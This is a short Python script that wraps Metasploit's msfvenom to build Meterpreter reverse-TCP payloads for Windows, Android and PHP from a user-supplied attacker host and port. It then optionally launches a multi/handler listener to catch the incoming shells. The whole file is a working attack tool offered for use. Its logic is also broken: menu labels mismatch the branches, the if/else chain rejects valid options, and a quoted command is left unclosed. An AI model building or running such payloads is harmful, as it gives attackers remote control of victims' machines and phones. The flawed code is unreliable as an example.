import os 
com = os.system
""" ANSI color codes """
BLACK = "\033[0;30m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
BROWN = "\033[0;33m"
BLUE = "\033[0;34m"
PURPLE = "\033[0;35m"
CYAN = "\033[0;36m"
LIGHT_GRAY = "\033[0;37m"
DARK_GRAY = "\033[1;30m"
LIGHT_RED = "\033[1;31m"
LIGHT_GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
LIGHT_BLUE = "\033[1;34m"
LIGHT_PURPLE = "\033[1;35m"
LIGHT_CYAN = "\033[1;36m"
LIGHT_WHITE = "\033[1;37m"
BOLD = "\033[1m"
FAINT = "\033[2m"
ITALIC = "\033[3m"
UNDERLINE = "\033[4m"
BLINK = "\033[5m"
NEGATIVE = "\033[7m"
CROSSED = "\033[9m"
END = "\033[0m"
os.system("clear")
lesin = '0'

print("[2] == windows = .exe")
print("[1] == android = .apk")
print("[3] == php = .exe")
        
ask = input("print your option number : ")
lhost = input("LHOST : ")
lport = input("LPORT")
file_path = input("FILE PATH : ")
if ask == "1" :
    com("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -e x86/shikata_ga_nai -f exe -o "+file_path+"/windowds_payload.exe")
if ask == "2" : 
    com("msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -o "+file_path+"/android_payload.apk")
if ask == "3" : 
    com("msfvenom -p php/meterpreter_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f raw > "+file_path+"/php_payload.php")
else :
    print("eror")
    exit()

lesin_ask = input("you want lesin Y/n : ")
if lesin_ask == "y" :
    if ask == "1" : 
        com('msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run;')

if ask == "2" : 
        com('msfconsole -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run;')

if ask == "3" : 
        com('msfconsole -x "use exploit/multi/handler; set PAYLOAD php/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run;')
if lesin_ask == "n" :
    print("ok")






# "+lhost+" "+lport+" "+file_path+"